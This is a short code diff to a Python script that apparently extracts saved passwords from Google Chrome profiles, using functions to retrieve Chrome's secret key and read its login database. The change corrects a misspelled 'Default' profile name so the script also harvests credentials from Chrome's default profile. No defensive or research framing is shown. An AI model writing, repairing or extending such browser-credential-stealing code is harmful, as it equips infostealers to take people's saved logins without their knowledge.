@@ -66,7 +66,7 @@ def connect_to_db(chrome_login_db):
 
 def get_chrome_passwords():
     secret_key = retrieve_secret_key()
-    profile_folders = [folder for folder in os.listdir(CHROME_USER_DATA_PATH) if folder.startswith("Profile") or folder == "Deafult"]
+    profile_folders = [folder for folder in os.listdir(CHROME_USER_DATA_PATH) if folder.startswith("Profile") or folder == "Default"]
     passwords = ""
 
     for profile in profile_folders:
